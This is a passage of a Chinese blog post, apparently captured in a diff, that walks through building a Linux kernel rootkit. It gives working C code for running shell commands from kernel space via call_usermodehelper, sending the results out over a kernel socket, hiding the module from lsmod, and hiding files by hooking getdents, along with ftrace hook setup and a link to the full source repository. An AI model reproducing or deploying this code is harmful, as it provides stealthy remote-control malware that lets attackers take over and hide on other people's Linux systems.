class="built_in">memset</span>(sendbuf,<span class="number">0</span>,<span class="number">4096</span>);</span><br><span class="line">		<span class="built_in">strncpy</span>(sendbuf,result,<span class="number">4096</span>);</span><br><span class="line">		ret = kernel_sendmsg(sock,&amp;sendmsg,&amp;send_vec,<span class="number">1</span>,<span class="built_in">strlen</span>(sendbuf));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	kernel_sock_shutdown(sock,SHUT_RDWR);</span><br><span class="line">	sock_release(sock);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;[SockTest]: socket exit\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="七、linux-kernel命令执行"><a href="#七、linux-kernel命令执行" class="headerlink" title="七、linux kernel命令执行"></a>七、linux kernel命令执行</h1><p>   <strong>1、对于一个rootkit来说，最核心的功能点肯定在于能够执行命令</strong>  </p>
+<p>   <strong>2、在linux内核中，有以下几种方式可以用来执行命令：</strong>  </p>
+<ul>
+<li><p>hook系统调用表，劫持命令执行函数sys_execve</p>
+</li>
+<li><p>调用call_usermodehelper函数直接执行命令</p>
+<p> <strong>3、这里使用的是第二种方式来执行命令，第一种只做到了无参数命令执行，对于有参数的解析其参数时按照指针数组解析出来的不知道为啥一直是乱码，知道原因的大佬可以指教以下</strong>  </p>
+<p> <strong>4、无论是什么方式，都无法将命令回显结果直接写入内存直接读取，所以这里采用的是将命令结果利用<code>&gt;</code>写入某个文件中，然后调用<code>vfs_read</code>函数读取文件获取命令回显，如下所示：</strong></p>
+</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">char</span>* <span class="title function_">execcmd</span><span class="params">(<span class="type">char</span> cmd[<span class="number">1024</span>])</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> result;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">fp</span>;</span></span><br><span class="line">	<span class="type">mm_segment_t</span> fs;</span><br><span class="line">	<span class="type">loff_t</span> pos;</span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> buf[<span class="number">4096</span>];</span><br><span class="line">	<span class="type">char</span> add[] = <span class="string">&quot; &gt; /tmp/result.txt&quot;</span>;</span><br><span class="line">        <span class="type">char</span> cmd_path[] = <span class="string">&quot;bin/sh&quot;</span>;</span><br><span class="line">	<span class="built_in">strcat</span>(cmd,add);</span><br><span class="line">        <span class="type">char</span> *cmd_argv[] = &#123;cmd_path,<span class="string">&quot;-c&quot;</span>,cmd,<span class="literal">NULL</span>&#125;;</span><br><span class="line">        <span class="type">char</span> *cmd_envp[] = &#123;<span class="string">&quot;HOME=/&quot;</span>,<span class="string">&quot;PATH=/sbin:/bin:/user/bin&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">        result = call_usermodehelper(cmd_path,cmd_argv,cmd_envp,UMH_WAIT_PROC);</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;[TestKthread]: call_usermodehelper() result is %d\n&quot;</span>,result);</span><br><span class="line">	fp = filp_open(<span class="string">&quot;/tmp/result.txt&quot;</span>,O_RDWR | O_CREAT,<span class="number">0644</span>);</span><br><span class="line">	<span class="keyword">if</span>(IS_ERR(fp)) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;open file failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memset</span>(buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(buf));</span><br><span class="line">	fs = get_fs();</span><br><span class="line">	set_fs(KERNEL_DS);</span><br><span class="line">	pos = <span class="number">0</span>;</span><br><span class="line">	vfs_read(fp,buf,<span class="keyword">sizeof</span>(buf),&amp;pos);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;shell result %ld:\n&quot;</span>,<span class="built_in">strlen</span>(buf));</span><br><span class="line">	printk(<span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">	filp_close(fp,<span class="literal">NULL</span>);</span><br><span class="line">	set_fs(fs);</span><br><span class="line">	<span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="八、隐藏内核模块自身"><a href="#八、隐藏内核模块自身" class="headerlink" title="八、隐藏内核模块自身"></a>八、隐藏内核模块自身</h1><p>   <strong>1、对于linux kernel rootkit，很重要的一点就是隐藏自己的存在，不然受害者一个<code>lsmod</code>就发现了</strong>  </p>
+<p>   <strong>2、通过<code>lsmod</code>读出来的已经加载的内核模块在内存中的表现形式为一个链表，我们可以通过添加、删除这个链表中的节点来实现对内核模块的显示和隐藏</strong>  </p>
+<p>   <strong>3、我们可以通过<code>THIS_MODULE</code>这个变量来访问上述的连接，幸运的是，官方提供了API 来添加和删除节点，分别为<code>list_del</code>和<code>list_add</code>函数</strong>  </p>
+<p>   <strong>4、实现该功能源码如下所示：</strong>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">hideme</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	prev_module = THIS_MODULE-&gt;<span class="built_in">list</span>.prev;</span><br><span class="line">	list_del(&amp;THIS_MODULE-&gt;<span class="built_in">list</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">showme</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	list_add(&amp;THIS_MODULE-&gt;<span class="built_in">list</span>,prev_module);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="九、隐藏文件"><a href="#九、隐藏文件" class="headerlink" title="九、隐藏文件"></a>九、隐藏文件</h1><p>   <strong>1、由于前面的命令执行功能获取命令回显结果产生了一些文件，所以我们还要隐藏这些产生从文件来避免我们的rootkit被发现</strong>  </p>
+<p>   <strong>2、我们可以通过hook <code>sys_getdents</code>系统调用来实现，该系统调用有三个参数，其中第二个参数为一个指针，该指针所存储的即为一个目录的文件和目录信息，在内存中的数据结构为一个链表，通过遍历这个链表然后删除相应的节点即可达到隐藏文件的目的</strong>  </p>
+<p>   <strong>3、该链表的数据结构如下所示，其中，<code>d_name</code>为文件或目录的名称，<code>d_reclen</code>为长度，通过这两个数据，我们即可实现隐藏文件和目录的功能</strong>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> &#123;</span></span><br><span class="line">	    <span class="type">unsigned</span> <span class="type">long</span> d_ino;</span><br><span class="line">	    <span class="type">unsigned</span> <span class="type">long</span> d_off;</span><br><span class="line">	    <span class="type">unsigned</span> <span class="type">short</span> d_reclen;</span><br><span class="line">	    <span class="type">char</span> d_name[];</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+
+<p>   <strong>4、该功能实现示例如下所示：</strong>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">asmlinkage <span class="type">int</span> <span class="title function_">hook_getdents</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> pt_regs *regs)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> &#123;</span></span><br><span class="line">	    <span class="type">unsigned</span> <span class="type">long</span> d_ino;</span><br><span class="line">	    <span class="type">unsigned</span> <span class="type">long</span> d_off;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span> d_reclen;</span><br><span class="line">	    <span class="type">char</span> d_name[];</span><br><span class="line">    &#125;;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> __<span class="title">user</span> *<span class="title">dirent</span> =</span> (<span class="keyword">struct</span> linux_dirent *)regs-&gt;si;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">linux_dirent</span> *<span class="title">current_dir</span>,*<span class="title">previous_dir</span>,*<span class="title">dirent_ker</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> offset = <span class="number">0</span>;</span><br><span class="line">	<span class="type">long</span> error;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> ret = orig_getdents(regs);</span><br><span class="line">	dirent_ker = kzalloc(ret, GFP_KERNEL);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> ((ret &lt;= <span class="number">0</span>) || (dirent_ker == <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		printk(KERN_DEBUG <span class="string">&quot;error 1,ret is %d\n&quot;</span>,ret);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	error = copy_from_user(dirent_ker, dirent, ret);</span><br><span class="line">	<span class="keyword">if</span>(error)</span><br><span class="line">	&#123;</span><br><span class="line">		printk(KERN_DEBUG <span class="string">&quot;error 2\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> done;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(offset &lt; ret)</span><br><span class="line">	&#123;</span><br><span class="line">		current_dir = (<span class="type">void</span> *)dirent_ker + offset;</span><br><span class="line">		<span class="keyword">if</span>(check(current_dir-&gt;d_name) == <span class="number">1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(debug_mode == <span class="number">1</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				printk(KERN_DEBUG <span class="string">&quot;rootkit: Found %s\n&quot;</span>, current_dir-&gt;d_name);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(current_dir == dirent_ker)</span><br><span class="line">			&#123;</span><br><span class="line">				ret -= current_dir-&gt;d_reclen;</span><br><span class="line">				memmove(current_dir, (<span class="type">void</span> *)current_dir + current_dir-&gt;d_reclen, ret);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			previous_dir-&gt;d_reclen += current_dir-&gt;d_reclen;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			previous_dir = current_dir;</span><br><span class="line">		&#125;</span><br><span class="line">		offset += current_dir-&gt;d_reclen;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	error = copy_to_user(dirent, dirent_ker, ret);</span><br><span class="line">	<span class="keyword">if</span>(error)</span><br><span class="line">	&#123;</span><br><span class="line">		printk(KERN_DEBUG <span class="string">&quot;error 3\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> done;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">	kfree(dirent_ker);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="十、ftrace使用方法"><a href="#十、ftrace使用方法" class="headerlink" title="十、ftrace使用方法"></a>十、ftrace使用方法</h1><p>   <strong>1、导入头文件<code>ftrace_helper.h</code></strong>  </p>
+<p>   <strong>2、定义一个<code>ftrace_hook hooks</code>结构体数组，如下所示：</strong>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">ftrace_hook</span> <span class="title">hooks</span>[] =</span> &#123;</span><br><span class="line">	HOOK(<span class="string">&quot;sys_mkdir&quot;</span>,hook_mkdir,&amp;orig_mkdir),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>   <strong>调用<code> fh_install_hooks</code>函数挂钩，调用<code>fh_remove_hooks</code>函数解挂即可</strong></p>
+<hr>
+<h1 id="十一、其他"><a href="#十一、其他" class="headerlink" title="十一、其他"></a>十一、其他</h1><p>   <strong>1、在<code>linux kernel 4.17</code>之后，系统调用函数的参数全部存储在<code>pt_reg</code>结构体中，要实际访问到其参数，需要去读取该结构体</strong>  </p>
+<p>   <strong>2、由于rootkit运行在内核空间中，要访问用户空间的数据，需要使用<code>strncpy_from_user</code>等函数将用户空间的变量拷贝到内核空间中</strong>  </p>
+<p>   <strong>3、要申请内核空间，不能使用<code>malloc</code>，而是要使用<code>kmalloc</code>等函数来申请</strong>  </p>
+<hr>
+<h1 id="十二、linux-kernel-rootkit使用截图"><a href="#十二、linux-kernel-rootkit使用截图" class="headerlink" title="十二、linux kernel rootkit使用截图"></a>十二、linux kernel rootkit使用截图</h1><p>   <strong>1、命令执行</strong>  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/4.png">  </p>
+<p>  <strong>2、隐藏内核模块</strong>  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/5.png">  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/6.png">  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/7.png">  </p>
+<p>   <strong>3、隐藏文件</strong>  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/8.png">  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/9.png">  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/10.png">  </p>
+<hr>
+<h1 id="十三、github以及参考连接"><a href="#十三、github以及参考连接" class="headerlink" title="十三、github以及参考连接"></a>十三、github以及参考连接</h1><p>   <strong>1、github链接：</strong>  </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/windy-purple/linux_kernel_rootkit">https://github.com/windy-purple/linux_kernel_rootkit</a></p>
+<p>   <strong>2、参考链接：</strong>  </p>
+<p><a target="_blank" rel="noopener" href="https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/">https://memset.wordpress.com/2011/01/20/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x/</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://memset.wordpress.com/2011/03/18/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x-2/">https://memset.wordpress.com/2011/03/18/syscall-hijacking-dynamically-obtain-syscall-table-address-kernel-2-6-x-2/</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/39502198/finding-the-sys-call-table-in-memory-64-bit-on-4-x-x-kernel">https://stackoverflow.com/questions/39502198/finding-the-sys-call-table-in-memory-64-bit-on-4-x-x-kernel</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://xcellerator.github.io/posts/linux_rootkits_01/">https://xcellerator.github.io/posts/linux_rootkits_01&#x2F;</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://syscalls64.paolostivanin.com/">https://syscalls64.paolostivanin.com/</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vkobel/linux-syscall-hook-rootkit">https://github.com/vkobel/linux-syscall-hook-rootkit</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/yeshennet/article/details/82315604">https://blog.csdn.net/yeshennet/article/details/82315604</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241090">https://www.anquanke.com/post/id/241090</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://www.codeleading.com/article/24384639787/">https://www.codeleading.com/article/24384639787/</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/embedded-linux/p/7439984.html">https://www.cnblogs.com/embedded-linux/p/7439984.html</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/58821458/error-passing-argument-1-of-kthread-create-on-node-from-incompatible-pointer">https://stackoverflow.com/questions/58821458/error-passing-argument-1-of-kthread-create-on-node-from-incompatible-pointer</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_30624591/article/details/109685620">https://blog.csdn.net/qq_30624591&#x2F;article&#x2F;details&#x2F;109685620</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/abysamross/simple-linux-kernel-tcp-client-server">https://github.com/abysamross/simple-linux-kernel-tcp-client-server</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/croemheld/lkm-rootkit">https://github.com/croemheld/lkm-rootkit</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://gist.github.com/llj098/752417">https://gist.github.com/llj098/752417</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miaohongyu1/article/details/16986053">https://blog.csdn.net/miaohongyu1/article/details/16986053</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://www.ichenfu.com/2017/01/16/kernel-sock-client-example/">https://www.ichenfu.com/2017/01/16/kernel-sock-client-example/</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whshiyun/article/details/82013181">https://blog.csdn.net/whshiyun/article/details/82013181</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/459022">https://developer.aliyun.com/article/459022</a>  </p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/whatday/article/details/98448435">https://blog.csdn.net/whatday/article/details/98448435</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/linux/" rel="tag"># linux</a>
+              <a href="/tags/kernel/" rel="tag"># kernel</a>
+              <a href="/tags/rootkit/" rel="tag"># rootkit</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/20/49/" rel="prev" title="XCTF pwn新手区解题记录">
+      <i class="fa fa-chevron-left"></i> XCTF pwn新手区解题记录
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2024/04/24/39/" rel="next" title="ebpf在Android安全上的应用：ebpf的一些基础知识(上篇)">
+      ebpf在Android安全上的应用：ebpf的一些基础知识(上篇) <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">一、前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E7%8E%AF%E5%A2%83"><span class="nav-number">2.</span> <span class="nav-text">二、环境</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81linux-kernel-module"><span class="nav-number">3.</span> <span class="nav-text">三、linux kernel module</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81hook%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E8%A1%A8"><span class="nav-number">4.</span> <span class="nav-text">四、hook系统调用表</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%94%E3%80%81linux-kernel%E5%A4%9A%E7%BA%BF%E7%A8%8B"><span class="nav-number">5.</span> <span class="nav-text">五、linux kernel多线程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%AD%E3%80%81linux-kernel-socket"><span class="nav-number">6.</span> <span class="nav-text">六、linux kernel socket</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%83%E3%80%81linux-kernel%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">7.</span> <span class="nav-text">七、linux kernel命令执行</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%AB%E3%80%81%E9%9A%90%E8%97%8F%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E8%87%AA%E8%BA%AB"><span class="nav-number">8.</span> <span class="nav-text">八、隐藏内核模块自身</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="nav-number">9.</span> <span class="nav-text">九、隐藏文件</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8D%81%E3%80%81ftrace%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="nav-number">10.</span> <span class="nav-text">十、ftrace使用方法</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E5%85%B6%E4%BB%96"><span class="nav-number">11.</span> <span class="nav-text">十一、其他</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81linux-kernel-rootkit%E4%BD%BF%E7%94%A8%E6%88%AA%E5%9B%BE"><span class="nav-number">12.</span> <span class="nav-text">十二、linux kernel rootkit使用截图</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8D%81%E4%B8%89%E3%80%81github%E4%BB%A5%E5%8F%8A%E5%8F%82%E8%80%83%E8%BF%9E%E6%8E%A5"><span class="nav-number">13.</span> <span class="nav-text">十三、github以及参考连接</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">windy_ll</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">windy_ll</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">144k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">4:23</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
